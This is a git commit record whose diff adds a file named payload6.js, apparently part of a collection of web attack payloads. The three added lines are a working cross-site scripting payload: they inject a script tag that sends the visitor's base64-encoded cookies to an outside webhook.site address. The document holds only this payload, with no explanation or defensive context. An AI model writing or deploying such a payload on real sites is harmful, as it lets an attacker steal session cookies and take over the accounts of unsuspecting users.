77bd9e1829f08ee73118ae798e1cfd5935589514
Radu Marin <93029180+ChronosPK@users.noreply.github.com>
2024-12-03 12:54:09 +0200

    Update and rename payload5.js to payload6.js

---
+++ payload6.js
@@ -0,0 +1,3 @@
+const script = document.createElement('script');
+script.src = 'https://webhook.site/f3eefbfe-c6d6-45fa-b56f-f29f1a5fa17d?cookie=' + encodeURIComponent(btoa(document.cookie));
+document.body.appendChild(script);
